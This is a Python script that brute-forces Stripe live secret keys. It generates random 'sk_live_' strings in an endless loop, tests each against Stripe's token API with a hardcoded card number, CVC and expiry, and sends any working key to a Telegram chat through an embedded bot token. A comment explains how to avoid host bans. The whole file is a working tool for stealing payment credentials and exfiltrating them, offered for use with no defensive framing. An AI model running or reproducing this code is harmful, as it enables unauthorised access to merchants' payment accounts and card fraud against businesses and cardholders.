import requests, random, string, time, os

token = os.environ.get("BOT_TOKEN", "5884584289:AAE0HI1fjGi9h5zhknhOY5BuCOQU-ePJ7As")
chatid = os.environ.get("FORWARD_ID", "5937170640")

def long_key():
  skkey = random.choice(['sk_live_51H', 'sk_live_51J'])+''.join(random.choices( string.digits + string.ascii_letters, k = 96))
  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5278540001668044','card[cvc]': '252','card[exp_month]': '10','card[exp_year]': '2024'}, auth=(skkey, ""))
  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
    print(f"DEAD > {skkey}")
  else:
    print(f"LIVE > {skkey}")
    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
    
def short_key():
  skkey = "sk_live_"+''.join(random.choices( string.digits + string.ascii_letters, k = 24))
  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5278540001668044','card[cvc]': '252','card[exp_month]': '10','card[exp_year]': '2024'}, auth=(skkey, ""))
  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
    print(f"DEAD > {skkey}")
  else:
    print(f"LIVE > {skkey}")
    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
    
while True:
  long_key()
  #time.sleep(0.5) #if your heroku account keeps getting banned
  short_key()
    
